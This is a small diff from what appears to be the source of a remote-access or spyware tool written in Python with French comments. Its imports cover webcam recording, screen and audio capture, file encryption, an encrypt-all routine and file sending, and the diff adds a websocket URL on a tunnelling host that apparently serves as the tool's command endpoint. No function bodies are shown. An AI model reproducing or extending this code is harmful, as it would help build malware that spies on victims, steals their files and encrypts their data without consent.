@@ -12,7 +12,7 @@ from .webcam import record_webcam
 from .os_nav import rm, encrypt_file, decrypt_file, chiff_all, home_user_only, send_file
 import requests
 from .live import record_screen_with_audio, screen_shoot
-
+url = "wss://calm-hawk-619340cb.tunnl.gg/ws/gan"
 cwd = os.getcwd()
 
 # --- CHARGEMENT SÉCURISÉ DE LA CONFIGURATION ---
